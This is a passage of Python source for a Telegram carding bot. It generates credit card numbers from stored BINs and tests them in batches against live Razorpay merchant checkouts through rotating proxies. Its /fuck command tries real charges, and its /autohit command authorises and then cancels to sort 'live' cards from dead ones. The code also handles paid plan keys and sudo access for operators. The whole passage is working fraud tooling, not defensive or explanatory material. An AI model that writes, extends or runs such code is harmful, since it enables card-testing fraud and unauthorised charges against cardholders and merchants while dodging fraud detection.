        f"  {e('proxy')} Total: <code>{total}</code>",
        parse_mode=ParseMode.HTML)

@require_sudo_access
async def cmd_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    proxies = await redis.lrange(RK_PROXIES, 0, -1)
    if not proxies:
        await update.message.reply_text(
            f"{e('error')} No proxies. Use <code>/addpxy</code>.",
            parse_mode=ParseMode.HTML)
        return
    lines = "\n".join(f"  {i}. <code>{safe(p)}</code>" for i, p in enumerate(proxies, 1))
    await update.message.reply_text(
        f"{e('proxy')} <b>Proxies ({len(proxies)})</b>\n\n{lines}",
        parse_mode=ParseMode.HTML)

@require_sudo_access
async def cmd_testpxy(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    proxies = await redis.lrange(RK_PROXIES, 0, -1)
    if not proxies:
        await update.message.reply_text(
            f"{e('error')} No proxies loaded.", parse_mode=ParseMode.HTML)
        return
    msg = await update.message.reply_text(
        f"{e('loading')} Testing {len(proxies)} proxies...", parse_mode=ParseMode.HTML)
    results = []
    good = bad = 0
    for raw in proxies:
        ok, info, lat = await test_proxy(raw)
        if ok:
            good += 1
            results.append(
                f"  {e('live')} <code>{safe(raw[:35])}</code>\n"
                f"     └ {safe(info)} | <code>{lat}ms</code>")
        else:
            bad += 1
            results.append(
                f"  {e('offline')} <code>{safe(raw[:35])}</code>\n"
                f"     └ {safe(info)}")
    text = (
        f"{e('proxy')} <b>Proxy Test Results</b>\n\n"
        + "\n\n".join(results)
        + f"\n\n{e('check')} Live: <code>{good}</code>  {e('cross')} Dead: <code>{bad}</code>"
    )
    await msg.edit_text(text, parse_mode=ParseMode.HTML)

@require_sudo_access
async def cmd_rmpxy(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    proxies = await redis.lrange(RK_PROXIES, 0, -1)
    if not proxies:
        await update.message.reply_text(
            f"{e('error')} No proxies to remove.", parse_mode=ParseMode.HTML)
        return
    if context.args:
        try:
            idx = int(context.args[0]) - 1
            if 0 <= idx < len(proxies):
                await redis.lrem(RK_PROXIES, 1, proxies[idx])
                await update.message.reply_text(
                    f"{e('check')} Removed proxy #{idx+1}.", parse_mode=ParseMode.HTML)
            else:
                await update.message.reply_text(
                    f"{e('error')} Index out of range.", parse_mode=ParseMode.HTML)
            return
        except ValueError:
            pass
    keyboard = [[btn(f"🗑 {(p[:40]+'…') if len(p)>40 else p}", f"rmpxy_{i}")]
                for i, p in enumerate(proxies)]
    keyboard.append([btn(f"{e('cross')} Cancel", "cancel")])
    await update.message.reply_text(
        f"{e('tool')} <b>Select proxy to remove:</b>",
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup(keyboard))

@require_sudo_access
async def cmd_clrpxy(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await redis.delete(RK_PROXIES)
    await update.message.reply_text(
        f"{e('check')} All proxies cleared. {e('fire')}", parse_mode=ParseMode.HTML)

# ═══════════════════════════════════════════════════════════════
#         BIN MANAGEMENT
# ═══════════════════════════════════════════════════════════════

@require_sudo_access
async def cmd_addbim(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not context.args:
        await update.message.reply_text(
            f"{e('error')} Usage: <code>/addbim BIN1 BIN2 …</code>\n"
            f"Example: <code>/addbim 411111  5xxxxx|12|25|rnd</code>",
            parse_mode=ParseMode.HTML)
        return
    existing = set(await redis.lrange(RK_BINS, 0, -1))
    added = bad = dupe = 0
    for bp in context.args:
        ok, _ = validate_bin(bp)
        if not ok:
            bad += 1
            continue
        if bp in existing:
            dupe += 1
            continue
        await redis.lpush(RK_BINS, bp)
        existing.add(bp)
        added += 1
    total = await redis.llen(RK_BINS)
    await update.message.reply_text(
        f"{e('check')} <b>BINs Added: {added}</b>\n"
        f"  {e('error')} Invalid: <code>{bad}</code>  Dupe: <code>{dupe}</code>\n"
        f"  {e('bin')} Total: <code>{total}</code>",
        parse_mode=ParseMode.HTML)

@require_sudo_access
async def cmd_chkbim(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    bins = await redis.lrange(RK_BINS, 0, -1)
    if not bins:
        await update.message.reply_text(
            f"{e('error')} No BINs. Use <code>/addbim</code>.", parse_mode=ParseMode.HTML)
        return
    lines = "\n".join(f"  {i}. <code>{safe(b)}</code>" for i, b in enumerate(bins, 1))
    await update.message.reply_text(
        f"{e('bin')} <b>BINs ({len(bins)})</b>\n\n{lines}", parse_mode=ParseMode.HTML)

@require_sudo_access
async def cmd_rmbin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    bins = await redis.lrange(RK_BINS, 0, -1)
    if not bins:
        await update.message.reply_text(
            f"{e('error')} No BINs.", parse_mode=ParseMode.HTML)
        return
    if context.args:
        try:
            idx = int(context.args[0]) - 1
            if 0 <= idx < len(bins):
                await redis.lrem(RK_BINS, 1, bins[idx])
                await update.message.reply_text(
                    f"{e('check')} Removed BIN: <code>{safe(bins[idx])}</code>",
                    parse_mode=ParseMode.HTML)
            else:
                await update.message.reply_text(
                    f"{e('error')} Index out of range.", parse_mode=ParseMode.HTML)
            return
        except ValueError:
            pass
    keyboard = [[btn(f"🗑 {b}", f"rmbin_{i}")] for i, b in enumerate(bins)]
    keyboard.append([btn(f"{e('cross')} Cancel", "cancel")])
    await update.message.reply_text(
        f"{e('tool')} Select BIN to remove:",
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup(keyboard))

@require_sudo_access
async def cmd_binlookup(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not context.args:
        await update.message.reply_text(
            f"{e('error')} Usage: <code>/binlookup 411111</code>",
            parse_mode=ParseMode.HTML)
        return
    bin6 = context.args[0][:8]
    msg  = await update.message.reply_text(
        f"{e('loading')} Looking up BIN <code>{safe(bin6)}</code>...",
        parse_mode=ParseMode.HTML)
    info = await lookup_bin(bin6)
    await msg.edit_text(
        f"{e('bin')} <b>BIN Lookup: <code>{safe(bin6)}</code></b>\n\n"
        f"  {e('card')}     Scheme:  <code>{info['scheme']}</code>\n"
        f"  {e('star')}     Type:    <code>{info['type']}</code>\n"
        f"  {e('diamond')}  Brand:   <code>{info['brand'] or 'N/A'}</code>\n"
        f"  {e('money')}    Bank:    <code>{safe(info['bank'])}</code>\n"
        f"  {e('location')} Country: <code>{safe(info['country'])}</code> {info['emoji']}",
        parse_mode=ParseMode.HTML)

# ═══════════════════════════════════════════════════════════════
#         PAYMENT TESTING — /fuck (real charge) & /autohit
# ═══════════════════════════════════════════════════════════════

@require_sudo_access
async def cmd_fuck(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    sites = await redis.lrange(RK_SITES, 0, -1)
    bins  = await redis.lrange(RK_BINS,  0, -1)
    if not sites:
        await update.message.reply_text(
            f"{e('error')} No sites loaded. Use <code>/addsite</code> first.",
            parse_mode=ParseMode.HTML)
        return
    if not bins:
        await update.message.reply_text(
            f"{e('error')} No BINs loaded. Use <code>/addbim</code> first.",
            parse_mode=ParseMode.HTML)
        return
    proxies = await redis.llen(RK_PROXIES)
    keyboard = InlineKeyboardMarkup([
        [btn("₹1  Micro",  "test_100"),   btn("₹10 Basic",  "test_1000")],
        [btn("₹50 Medium", "test_5000"),  btn("₹100 High",  "test_10000")],
        [btn(f"{e('cross')} Cancel", "cancel")],
    ])
    await update.message.reply_text(
        f"{e('fire')} <b>Real Payment Testing</b> {e('money')}\n\n"
        f"  {e('site')}  Sites:   <code>{len(sites)}</code>\n"
        f"  {e('bin')}   BINs:    <code>{len(bins)}</code>\n"
        f"  {e('proxy')} Proxies: <code>{proxies}</code>\n\n"
        f"{e('money')} <b>Select amount (real charge — no cancel):</b>\n"
        f"{e('error')} <i>Cards will be actually charged!</i>",
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard)

@require_sudo_access
async def cmd_autohit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    sites = await redis.lrange(RK_SITES, 0, -1)
    bins  = await redis.lrange(RK_BINS,  0, -1)
    if not sites:
        await update.message.reply_text(
            f"{e('error')} No sites. Use <code>/addsite</code>.",
            parse_mode=ParseMode.HTML)
        return
    if not bins:
        await update.message.reply_text(
            f"{e('error')} No BINs. Use <code>/addbim</code>.",
            parse_mode=ParseMode.HTML)
        return
    proxies = await redis.llen(RK_PROXIES)
    keyboard = InlineKeyboardMarkup([
        [btn("₹1  Micro",  "auto_100"),   btn("₹10 Basic",  "auto_1000")],
        [btn("₹50 Medium", "auto_5000"),  btn("₹100 High",  "auto_10000")],
        [btn(f"{e('cross')} Cancel", "cancel")],
    ])
    await update.message.reply_text(
        f"{e('tds')} <b>Auto-Hit Card Checker</b> {e('search')}\n\n"
        f"  {e('site')}  Sites:   <code>{len(sites)}</code>\n"
        f"  {e('bin')}   BINs:    <code>{len(bins)}</code>\n"
        f"  {e('proxy')} Proxies: <code>{proxies}</code>\n\n"
        f"{e('info')} <b>Select amount (auto-cancel after auth — no real charge):</b>",
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard)

@require_sudo_access
async def cmd_stop(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    cid = update.effective_chat.id
    if active_tests.get(cid):
        active_tests[cid] = False
        await update.message.reply_text(
            f"{e('stop')} Stopping active test...", parse_mode=ParseMode.HTML)
    else:
        await update.message.reply_text(
            f"{e('info')} No active test running.", parse_mode=ParseMode.HTML)

async def run_payment_test(
    chat_id: int,
    amount_paise: int,
    context: ContextTypes.DEFAULT_TYPE,
    cancel_mode: bool = True,
) -> None:
    MAX_BATCHES = 10
    sites   = await redis.lrange(RK_SITES,   0, -1)
    bins    = await redis.lrange(RK_BINS,     0, -1)
    proxies = await redis.lrange(RK_PROXIES,  0, -1)

    if not sites or not bins:
        await context.bot.send_message(
            chat_id, f"{e('error')} Missing sites or BINs.", parse_mode=ParseMode.HTML)
        return

    max_cards = min(BATCH_SIZE * MAX_BATCHES, len(bins) * 3)
    cards: List[str] = []
    for bp in bins:
        for card in generate_cards_streaming(bp, min(3, max(1, max_cards // len(bins)))):
            cards.append(card)
            if len(cards) >= max_cards:
                break
        if len(cards) >= max_cards:
            break

    if not cards:
        await context.bot.send_message(
            chat_id, f"{e('error')} Could not generate cards.", parse_mode=ParseMode.HTML)
        return

    batches  = [cards[i:i+BATCH_SIZE] for i in range(0, len(cards), BATCH_SIZE)][:MAX_BATCHES]
    amt_inr  = amount_paise // 100
    mode_str = "Real Charge" if not cancel_mode else "Auto-Hit"

    status_msg = await context.bot.send_message(
        chat_id,
        f"{e('cooking')} <b>Payment Test Started</b> — {mode_str}\n\n"
        f"  {e('money')} Amount:  <code>₹{amt_inr}</code>\n"
        f"  {e('card')}  Cards:   <code>{len(cards)}</code>\n"
        f"  {e('site')}  Sites:   <code>{len(sites)}</code>\n"
        f"  {e('mass')}  Batches: <code>{len(batches)}</code> × {BATCH_SIZE}\n"
        f"  {e('proxy')} Proxies: <code>{len(proxies)}</code>\n\n"
        f"{e('loading')} Testing...",
        parse_mode=ParseMode.HTML,
    )

    active_tests[chat_id] = True
    total_ok = total_charged = total_fail = 0
    processed = 0

    # Pre-check site liveness
    live_sites: List[Tuple[str, str]] = []
    for site in sites:
        pu = get_random_proxy_url(proxies)
        is_live, rzp_key, _ = await check_site_live(site, pu)
        if is_live:
            live_sites.append((site, rzp_key))

    if not live_sites:
        await status_msg.edit_text(
            f"{e('offline')} <b>No live Razorpay sites found!</b>\n\n"
            f"All {len(sites)} site(s) failed liveness check.",
            parse_mode=ParseMode.HTML)
        active_tests.pop(chat_id, None)
        return

    await context.bot.send_message(
        chat_id,
        f"{e('live')} <b>{len(live_sites)}/{len(sites)} sites live</b>\n"
        + "\n".join(f"  {e('check')} <code>{safe(s[0][:55])}</code>" for s in live_sites),
        parse_mode=ParseMode.HTML,
    )

    for b_idx, batch in enumerate(batches, 1):
        if not active_tests.get(chat_id):
            await context.bot.send_message(
                chat_id, f"{e('stop')} Test stopped.", parse_mode=ParseMode.HTML)
            break

        batch_results: List[str] = []

        for card_str in batch:
            if not active_tests.get(chat_id):
                break
            parts = card_str.split("|")
            if len(parts) < 4:
                continue
            cc_n, mm_n, yy_n, cvv_n = parts[0], parts[1], parts[2], parts[3]
            site_url, rzp_key = random.choice(live_sites)
            proxy_url = get_random_proxy_url(proxies)

            result = await check_card_razorpay(
                cc_n, mm_n, yy_n, cvv_n,
                site_url, proxy_url, cancel_mode=cancel_mode,
            )
            processed += 1
            await redis.hset(RK_STATS, "total_payments",
                             str(int(await redis.hget(RK_STATS, "total_payments") or 0) + 1))

            status = result.get("status", "error")
            msg_r  = result.get("message", "")

            if status == "charged":
                total_charged += 1
                icon = e("success")
                tag  = "CHARGED"
                await redis.hset(RK_STATS, "total_charged",
                                 str(int(await redis.hget(RK_STATS, "total_charged") or 0) + 1))
            elif status == "approved":
                total_ok += 1
                icon = e("approved")
                tag  = "LIVE/APPROVED"
            else:
                total_fail += 1
                icon = e("declined")
                tag  = "DEAD"

            batch_results.append(
                f"{icon} <b>{tag}</b>  <code>{safe(card_str)}</code>\n"
                f"     {e('gateway')} {safe(site_url[:50])}\n"
                f"     {e('info')} {safe(msg_r[:70])} "
                f"{e('time')}{datetime.now().strftime('%H:%M:%S')}"
            )

        if batch_results:
            batch_text = (
                f"{e('mass')} <b>Batch {b_idx}/{len(batches)}</b>  "
                f"({e('live')}{total_ok+total_charged} live | "
                f"{e('declined')}{total_fail} dead)\n\n"
                + "\n\n".join(batch_results)
            )
            await context.bot.send_message(chat_id, batch_text, parse_mode=ParseMode.HTML)

        if b_idx < len(batches) and active_tests.get(chat_id):
            await asyncio.sleep(BATCH_DELAY)

    active_tests.pop(chat_id, None)
    await status_msg.edit_text(
        f"{e('trophy')} <b>Payment Test Complete</b>\n\n"
        f"  {e('card')}    Tested:   <code>{processed}</code>\n"
        f"  {e('success')} Charged:  <code>{total_charged}</code>\n"
        f"  {e('approved')} Live:    <code>{total_ok}</code>\n"
        f"  {e('declined')} Dead:    <code>{total_fail}</code>\n"
        f"  {e('money')}   Amount:   <code>₹{amt_inr}</code>\n"
        f"  {e('mass')}    Batches:  <code>{len(batches)}</code>",
        parse_mode=ParseMode.HTML,
    )

# ═══════════════════════════════════════════════════════════════
#         /gen — Card generation
# ═══════════════════════════════════════════════════════════════

@require_auth
async def cmd_gen(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    ok, msg_rl = check_rate_limit(uid)
    if not ok:
        await update.message.reply_text(
            f"{e('cooldown')} {msg_rl}", parse_mode=ParseMode.HTML)
        return
    if not context.args:
        await update.message.reply_text(
            f"{e('card')} Usage: <code>/gen BIN amount</code>\n"
            f"Example: <code>/gen 411111 100</code>",
            parse_mode=ParseMode.HTML)
        return
    bin_pattern = context.args[0]
    try:
        amount = int(context.args[1]) if len(context.args) > 1 else 10
    except ValueError:
        await update.message.reply_text(
            f"{e('error')} Amount must be a number.", parse_mode=ParseMode.HTML)
        return
    if amount < 1 or amount > MAX_LIMIT:
        await update.message.reply_text(
            f"{e('error')} Amount must be 1–{MAX_LIMIT:,}.", parse_mode=ParseMode.HTML)
        return
    ok2, err = validate_bin(bin_pattern)
    if not ok2:
        await update.message.reply_text(f"{e('error')} {err}", parse_mode=ParseMode.HTML)
        return
    bin6     = bin_pattern.split("|")[0][:8]
    bin_info = await lookup_bin(bin6)
    status   = await update.message.reply_text(
        f"{e('loading')} <b>Generating {amount:,} cards...</b>\n"
        f"  {e('bin')} BIN: <code>{safe(bin6)}</code>  "
        f"{bin_info['scheme']} | {safe(bin_info['bank'])} | {safe(bin_info['country'])} {bin_info['emoji']}",
        parse_mode=ParseMode.HTML)
    bin_display = bin_pattern.split("|")[0]
    file_count  = 0
    cards_count = 0
    current_chunk: List[str] = []
    try:
        for card in generate_cards_streaming(bin_pattern, amount):
            current_chunk.append(card)
            cards_count += 1
            if len(current_chunk) >= MAX_LINES_PER_FILE:
                file_count += 1
                bio = BytesIO("\n".join(current_chunk).encode())
                bio.name = f"gen_{bin_display}_p{file_count}.txt"
                await _send_doc(update.message, bio, file_count, len(current_chunk))
                current_chunk = []
                await asyncio.sleep(SEND_DELAY)
        if current_chunk:
            file_count += 1
            bio = BytesIO("\n".join(current_chunk).encode())
            bio.name = f"gen_{bin_display}_p{file_count}.txt"
            await _send_doc(update.message, bio, file_count, len(current_chunk))
        old = int(await redis.hget(RK_STATS, "total_generated") or 0)
        await redis.hset(RK_STATS, "total_generated", str(old + cards_count))
        await status.edit_text(
            f"{e('success')} <b>Generated {cards_count:,} cards in {file_count} file(s)</b>\n"
            f"  {e('bin')}     BIN:     <code>{safe(bin_display)}</code>\n"
            f"  {e('card')}    Scheme:  <code>{bin_info['scheme']}</code>\n"
            f"  {e('money')}   Bank:    <code>{safe(bin_info['bank'])}</code>\n"
            f"  {e('location')} Country: <code>{safe(bin_info['country'])}</code> {bin_info['emoji']}",
            parse_mode=ParseMode.HTML)
    except Exception as ex:
        logger.exception("gen error")
        await status.edit_text(
            f"{e('error')} Generation failed: {safe(str(ex)[:100])}",
            parse_mode=ParseMode.HTML)

# ═══════════════════════════════════════════════════════════════
#         /split — File splitting
# ═══════════════════════════════════════════════════════════════

@require_auth
async def cmd_split(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    ok, msg_rl = check_rate_limit(uid)
    if not ok:
        await update.message.reply_text(
            f"{e('cooldown')} {msg_rl}", parse_mode=ParseMode.HTML)
        return
    if not context.args:
        await update.message.reply_text(
            f"{e('mass')} Usage: Reply to a .txt file with <code>/split 5</code>",
            parse_mode=ParseMode.HTML)
        return
    try:
        parts_count = int(context.args[0])
    except ValueError:
        await update.message.reply_text(
            f"{e('error')} Parts must be a number.", parse_mode=ParseMode.HTML)
        return
    if parts_count < 2 or parts_count > MAX_SPLIT_PARTS:
        await update.message.reply_text(
            f"{e('error')} Parts must be 2–{MAX_SPLIT_PARTS}.", parse_mode=ParseMode.HTML)
        return
    replied = update.message.reply_to_message
    if not replied or not replied.document:
        await update.message.reply_text(
            f"{e('error')} Reply to a <code>.txt</code> file.",
            parse_mode=ParseMode.HTML)
        return
    doc      = replied.document
    filename = doc.file_name or "file.txt"
    if not filename.lower().endswith(".txt"):
        await update.message.reply_text(
            f"{e('error')} Only <code>.txt</code> files.", parse_mode=ParseMode.HTML)
        return
    status = await update.message.reply_text(
        f"{e('loading')} Downloading file...", parse_mode=ParseMode.HTML)
    try:
        buf    = BytesIO()
        tgfile = await doc.get_file()
        await tgfile.download_to_memory(out=buf)
        buf.seek(0)
        try:
            content = buf.read().decode("utf-8")
        except UnicodeDecodeError:
            buf.seek(0)
            content = buf.read().decode("utf-8", errors="replace")
        lines = [x.strip() for x in content.splitlines() if x.strip()]
        if not lines:
            await status.edit_text(f"{e('error')} File is empty.", parse_mode=ParseMode.HTML)
            return
        if parts_count > len(lines):
            await status.edit_text(
                f"{e('error')} Only {len(lines):,} lines — can't split into {parts_count} parts.",
                parse_mode=ParseMode.HTML)
            return
        chunk_size = math.ceil(len(lines) / parts_count)
        chunks     = [lines[i:i+chunk_size] for i in range(0, len(lines), chunk_size)]
        base       = filename[:-4]
        await status.edit_text(
            f"{e('loading')} Sending {len(chunks)} parts...", parse_mode=ParseMode.HTML)
        for idx, chunk in enumerate(chunks, 1):
            part_bio      = BytesIO("\n".join(chunk).encode())
            part_bio.name = f"{base}_p{idx}of{len(chunks)}.txt"
            await _send_doc(update.message, part_bio, idx, len(chunk))
            await asyncio.sleep(SEND_DELAY)
        await status.edit_text(
            f"{e('success')} Split <code>{len(lines):,}</code> lines into <b>{len(chunks)}</b> parts. {e('sparkle')}",
            parse_mode=ParseMode.HTML)
    except Exception as ex:
        logger.exception("split error")
        await status.edit_text(
            f"{e('error')} {safe(str(ex)[:100])}", parse_mode=ParseMode.HTML)

# ═══════════════════════════════════════════════════════════════
#         /stats
# ═══════════════════════════════════════════════════════════════

@require_sudo_access
async def cmd_stats(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    sites   = await redis.llen(RK_SITES)
    proxies = await redis.llen(RK_PROXIES)
    bins    = await redis.llen(RK_BINS)
    sudo_ct = len(await redis.smembers(RK_SUDO))
    banned  = len(await redis.smembers(RK_BANNED))
    gen     = await redis.hget(RK_STATS, "total_generated") or "0"
    pays    = await redis.hget(RK_STATS, "total_payments")  or "0"
    charged = await redis.hget(RK_STATS, "total_charged")   or "0"
    await update.message.reply_text(
        f"{e('stats')} <b>Bot Statistics</b>\n\n"
        f"  {e('site')}    Sites:    <code>{sites}</code>\n"
        f"  {e('proxy')}   Proxies:  <code>{proxies}</code>\n"
        f"  {e('bin')}     BINs:     <code>{bins}</code>\n"
        f"  {e('crown')}   Sudos:    <code>{sudo_ct}</code>\n"
        f"  {e('ban')}     Banned:   <code>{banned}</code>\n\n"
        f"  {e('card')}    Gen:      <code>{gen}</code>\n"
        f"  {e('money')}   Payments: <code>{pays}</code>\n"
        f"  {e('success')} Charged:  <code>{charged}</code>\n\n"
        f"  {e('tds')}     Redis:    {e('live')} Connected\n"
        f"  {e('fire')}    Version:  <code>v5.0</code>",
        parse_mode=ParseMode.HTML)

# ═══════════════════════════════════════════════════════════════
#         /bhosade — Full command list (admin/sudo only)
# ═══════════════════════════════════════════════════════════════

async def cmd_bhosade(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    if await is_banned(uid):
        return
    if not await is_sudo(uid):
        return  # silently ignore
    is_own = is_admin(uid)
    owner_cmds = (
        f"\n{e('crown')} <b>Owner Commands</b>\n"
        f"  <code>/sudo &lt;id&gt;</code>       — Grant sudo\n"
        f"  <code>/unsudo &lt;id&gt;</code>     — Revoke sudo\n"
        f"  <code>/sudolist</code>         — List sudo users\n"
        if is_own else ""
    )
    text = (
        f"{e('fire')} <b>Full Command Reference</b>\n"
        f"{e('lock')} <i>Authorized users only</i>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"{owner_cmds}"
        f"\n{e('ban')} <b>Ban Management</b>\n"
        f"  <code>/ban &lt;id&gt;</code>         — Ban user\n"
        f"  <code>/unban &lt;id&gt;</code>       — Unban user\n"
        f"  <code>/banlist</code>          — List banned users\n"
        f"\n{e('plan')} <b>Plan Management</b>\n"
        f"  <code>/addplan &lt;id&gt; &lt;days&gt; [name]</code> — Assign plan\n"
        f"  <code>/genkey &lt;days&gt; [count]</code>     — Generate keys\n"
        f"\n{e('site')} <b>Site Management</b>\n"
        f"  <code>/addsite &lt;url&gt;</code>    — Add Razorpay site\n"
        f"  <code>/live</code>              — List sites\n"
        f"  <code>/checksite</code>         — Live-check all sites\n"
        f"  <code>/rmsite [idx]</code>      — Remove site\n"
        f"\n{e('proxy')} <b>Proxy Management</b>\n"
        f"  <code>/addpxy &lt;p1 p2…&gt;</code>  — Add proxies\n"
        f"  <code>/proxy</code>             — List proxies\n"
        f"  <code>/testpxy</code>           — Test all proxies\n"
        f"  <code>/rmpxy [idx]</code>       — Remove proxy\n"
        f"  <code>/clrpxy</code>            — Clear all proxies\n"
        f"\n{e('bin')} <b>BIN Management</b>\n"
        f"  <code>/addbim &lt;BINs&gt;</code>   — Add BINs\n"
        f"  <code>/chkbim</code>            — List BINs\n"
        f"  <code>/rmbin [idx]</code>       — Remove BIN\n"
        f"  <code>/binlookup &lt;BIN&gt;</code> — BIN lookup\n"
        f"\n{e('money')} <b>Payment Testing</b>\n"
        f"  <code>/fuck</code>              — Real charge test\n"
        f"  <code>/autohit</code>           — Auto-hit (no charge)\n"
        f"  <code>/stop</code>              — Stop active test\n"
        f"\n{e('stats')} <b>Info &amp; Utilities</b>\n"
        f"  <code>/stats</code>             — Bot statistics\n"
        f"  <code>/gen &lt;BIN&gt; [amt]</code>  — Generate cards\n"
        f"  <code>/split &lt;n&gt;</code>        — Split .txt file\n"
        f"  <code>/profile</code>           — Your profile\n"
        f"  <code>/redeem &lt;KEY&gt;</code>     — Redeem plan key\n"
        f"  <code>/start</code>             — Main menu\n"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)

# ═══════════════════════════════════════════════════════════════
#              INLINE BUTTON CALLBACKS
# ═══════════════════════════════════════════════════════════════

async def callbacks(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    if not query:
        return
    await query.answer()
    uid     = query.from_user.id
    data    = query.data
    chat_id = query.message.chat_id

    if await is_banned(uid):
        await query.answer(f"🚫 You are banned", show_alert=True)
        return
    if not await is_authorized(uid):
        await query.answer(f"🔐 Access denied", show_alert=True)
        return

    # ── Site removal ─────────────────────────────────────────
    if data.startswith("rmsite_"):
        idx   = int(data.split("_")[1])
        sites = await redis.lrange(RK_SITES, 0, -1)
        if 0 <= idx < len(sites):
            await redis.lrem(RK_SITES, 1, sites[idx])
            await query.edit_message_text(
                f"{e('check')} Site removed:\n<code>{safe(sites[idx])}</code>",
                parse_mode=ParseMode.HTML)
        return

    # ── Proxy removal ─────────────────────────────────────────
    if data.startswith("rmpxy_"):
        idx     = int(data.split("_")[1])
        proxies = await redis.lrange(RK_PROXIES, 0, -1)
        if 0 <= idx < len(proxies):
            await redis.lrem(RK_PROXIES, 1, proxies[idx])
            await query.edit_message_text(
                f"{e('check')} Proxy removed:\n<code>{safe(proxies[idx])}</code>",
                parse_mode=ParseMode.HTML)
        return

    # ── BIN removal ───────────────────────────────────────────
    if data.startswith("rmbin_"):
        idx  = int(data.split("_")[1])
        bins = await redis.lrange(RK_BINS, 0, -1)
        if 0 <= idx < len(bins):
            await redis.lrem(RK_BINS, 1, bins[idx])
            await query.edit_message_text(
                f"{e('check')} BIN removed: <code>{safe(bins[idx])}</code>",
                parse_mode=ParseMode.HTML)
        return

    # ── Real charge test trigger ──────────────────────────────
    if data.startswith("test_"):
        if not await is_sudo(uid):
            await query.answer("Sudo access required", show_alert=True)
            return
        amount_paise = int(data.split("_")[1])
        amt_inr      = amount_paise // 100
        await query.edit_message_text(
            f"{e('cooking')} <b>Launching real charge test...</b>\n\n"
            f"  {e('money')} Amount: <code>₹{amt_inr}</code>\n"
            f"  {e('error')} This will attempt real charges!\n"
            f"  {e('loading')} Checking sites...",
            parse_mode=ParseMode.HTML)
        asyncio.create_task(
            run_payment_test(chat_id, amount_paise, context, cancel_mode=False))
        return

    # ── Auto-hit test trigger ─────────────────────────────────
    if data.startswith("auto_"):
        if not await is_sudo(uid):
            await query.answer("Sudo access required", show_alert=True)
            return
        amount_paise = int(data.split("_")[1])
        amt_inr      = amount_paise // 100
        await query.edit_message_text(
            f"{e('tds')} <b>Launching auto-hit test...</b>\n\n"
            f"  {e('money')} Amount: <code>₹{amt_inr}</code>\n"
            f"  {e('info')} No real charge — cancel after auth\n"
            f"  {e('loading')} Checking sites...",
            parse_mode=ParseMode.HTML)
        asyncio.create_task(
            run_payment_test(chat_id, amount_paise, context, cancel_mode=True))
        return

    # ── Cancel ────────────────────────────────────────────────
    if data == "cancel":
        await query.edit_message_text(
            f"{e('check')} Cancelled. {e('sparkle')}", parse_mode=ParseMode.HTML)
        return

    # ── Menu navigations ──────────────────────────────────────
    if data == "menu_test":
        sites = await redis.llen(RK_SITES)
        bins  = await redis.llen(RK_BINS)
        if sites == 0 or bins == 0:
            await query.edit_message_text(
                f"{e('error')} Need at least 1 site and 1 BIN.\n"
                f"Use <code>/addsite</code> and <code>/addbim</code>.",
                parse_mode=ParseMode.HTML)
            return
        keyboard = InlineKeyboardMarkup([
            [btn("₹1  Micro", "test_100"),   btn("₹10 Basic",  "test_1000")],
            [btn("₹50 Medium","test_5000"),   btn("₹100 High",  "test_10000")],
            [btn(f"{e('cross')} Cancel", "cancel")],
        ])
        await query.edit_message_text(
            f"{e('money')} <b>Select test amount (real charge):</b>",
            parse_mode=ParseMode.HTML, reply_markup=keyboard)
        return

    if data == "menu_sites":
        sites = await redis.lrange(RK_SITES, 0, -1)
        text  = (f"{e('site')} <b>Sites ({len(sites)})</b>\n\n"
                 + "\n".join(f"  {i}. <code>{safe(s)}</code>"
                              for i, s in enumerate(sites, 1))) if sites else f"{e('error')} No sites."
        await query.edit_message_text(text, parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[btn(f"{e('cross')} Close","cancel")]]))
        return

    if data == "menu_proxy":
        proxies = await redis.lrange(RK_PROXIES, 0, -1)
        text    = (f"{e('proxy')} <b>Proxies ({len(proxies)})</b>\n\n"
                   + "\n".join(f"  {i}. <code>{safe(p)}</code>"
                                for i, p in enumerate(proxies, 1))) if proxies else f"{e('error')} No proxies."
        await query.edit_message_text(text, parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[btn(f"{e('cross')} Close","cancel")]]))
        return

    if data == "menu_bins":
        bins = await redis.lrange(RK_BINS, 0, -1)
        text = (f"{e('bin')} <b>BINs ({len(bins)})</b>\n\n"
                + "\n".join(f"  {i}. <code>{safe(b)}</code>"
                             for i, b in enumerate(bins, 1))) if bins else f"{e('error')} No BINs."
        await query.edit_message_text(text, parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[btn(f"{e('cross')} Close","cancel")]]))
        return

    if data == "menu_stats":
        sites   = await redis.llen(RK_SITES)
        proxies = await redis.llen(RK_PROXIES)
        bins    = await redis.llen(RK_BINS)
        gen     = await redis.hget(RK_STATS, "total_generated") or "0"
        pays    = await redis.hget(RK_STATS, "total_payments")  or "0"
        charged = await redis.hget(RK_STATS, "total_charged")   or "0"
        await query.edit_message_text(
            f"{e('stats')} <b>Live Stats</b>\n\n"
            f"  {e('site')}    Sites:    <code>{sites}</code>\n"
            f"  {e('proxy')}   Proxies:  <code>{proxies}</code>\n"
            f"  {e('bin')}     BINs:     <code>{bins}</code>\n"
            f"  {e('card')}    Gen:      <code>{gen}</code>\n"
